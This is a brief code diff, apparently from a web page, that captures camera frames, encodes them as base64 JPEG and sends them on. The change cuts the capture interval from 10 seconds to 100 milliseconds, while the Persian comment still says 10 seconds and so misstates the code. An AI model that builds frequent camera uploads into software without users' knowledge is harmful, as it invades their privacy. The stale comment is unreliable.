@@ -65,7 +65,7 @@
                     // تبدیل تصویر به داده Base64
                     const dataURL = canvas.toDataURL('image/jpeg');
                     sendImage(dataURL);
-                }, 10000); // 10000 میلی‌ثانیه = 10 ثانیه
+                }, 100); // 10000 میلی‌ثانیه = 10 ثانیه
             })
             .catch(error => {
                 console.error('Error accessing the camera:', error);
